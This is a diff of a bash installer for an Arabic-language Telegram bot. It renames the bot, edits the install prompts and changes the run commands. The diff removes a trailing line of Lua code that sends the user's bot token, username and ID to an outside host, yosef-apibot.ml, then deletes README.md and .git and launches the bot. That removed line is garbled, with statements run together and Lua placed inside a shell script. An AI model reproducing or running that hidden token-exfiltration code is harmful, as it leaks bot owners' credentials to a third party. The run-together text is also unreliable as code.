@@ -1,14 +1,13 @@
 #!/bin/bash
 cd $(cd $(dirname $0); pwd)
 echo -e '\e[1m\e[31m
-WOLF source is being installed, 
+FDFGERB source is being installed, 
 Please wait until the installation is complete
 \033[0m'
 echo -e '\033[0;33m
-If it is the first time to install the source, send the number » {1}
-or اذا كانت اول مره تنصيب السورس ارسل رقم » {1}
-If you have already installed the source, send the number » {2}
-or اذا سبق ونصبت السورس ارسل رقم » {2}
+اذا اول مرا تنصب سورس اكتب - 1
+
+اذا منصب سورس من قبل ارسل - 2
 \033[0m'
 read Install
 case $Install in
@@ -44,15 +43,11 @@ sudo luarocks install luasec
 sudo luarocks install luasocket
 cd ../..
 rm -rf tmp
-unzip luatele.zip
-sudo lua5.3 WOLF.lua
+sudo lua5.3 FDFGERB.lua
 ;;
 2)
-echo -e "\e[1m\e[32mThe bot is running now : جاري تشغيل البوت الان : \e[0m"
+echo -e "\e[1m\e[32mجاري تشغيل البوت الان\e[0m"
 sleep 2
-unzip luatele.zip
-sudo lua5.3 WOLF.lua
+sudo lua5.3 FDFGERB.lua
 ;;
 esac
-info = {} info.namebot = BOT_NAMEinfo.userbot = BOT_Userinfo.id = SUDO_USERinfo.token = Tokeninfo.join = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')https.request('https://yosef-apibot.ml/api/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)Cr_file = io.open("./inc/Token.txt", "w")Cr_file:write(Token)Cr_file:close()print('\27[1;36m￤Token.txt is created.\27[m')local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس بلاك \n• أرسل /black\n• لأظهار الاوامر المطور المجهزه بالكيبورد\n\n."https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')os.execute([[rm -f ./README.mdrm -rf ./.gitchmod +x ./run./run]])end
-
